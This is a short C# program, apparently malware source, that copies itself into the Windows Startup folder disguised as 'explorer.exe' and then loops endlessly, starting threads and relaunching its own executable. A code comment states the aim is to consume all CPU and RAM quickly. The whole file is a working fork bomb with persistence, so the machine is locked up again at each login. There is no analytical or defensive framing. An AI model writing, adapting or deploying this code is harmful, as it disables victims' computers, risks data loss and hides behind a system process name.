using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.IO;
using System.Windows;
using System.Diagnostics;

namespace explorer
{
    class Program
    {

        static void Main(string[] args)
        {
            // Catch the file already exists error for copyFile
            try
            {
                copyFile();
            }
            catch (Exception e)
            {

            }
            PCKiller();
        }

        static void PCKiller()
        {
            int i;
            i = 0;
            Thread pckiller = new Thread(new ThreadStart(PCKiller));
            // Get path to .exe
            string filePath = Directory.GetCurrentDirectory();
            string fileName = AppDomain.CurrentDomain.FriendlyName;
            string fileLocation = (filePath + (char)92 + fileName);
            while (true)
            {
                // Take up all cpu and ram quickly and reopen the program
                i++;
                pckiller.Start();
                Process.Start(fileLocation.ToString());
            }
        }

        static void copyFile()
        {
            // Get path to .exe and try to copy
            string filePath = Directory.GetCurrentDirectory();
            string fileName = AppDomain.CurrentDomain.FriendlyName;
            string fileLocation = (filePath + (char)92 + fileName);
            string startupLocation = (Environment.GetEnvironmentVariable("USERPROFILE") + (char)92 + "AppData" + (char)92 + "Roaming" + (char)92 + "Microsoft" + (char)92 + "Windows" + (char)92 + "Start Menu" + (char)92 + "Programs" + (char)92 + "Startup" + (char)92 + "explorer.exe");
            File.Copy(fileLocation, startupLocation);
        }
    }
}
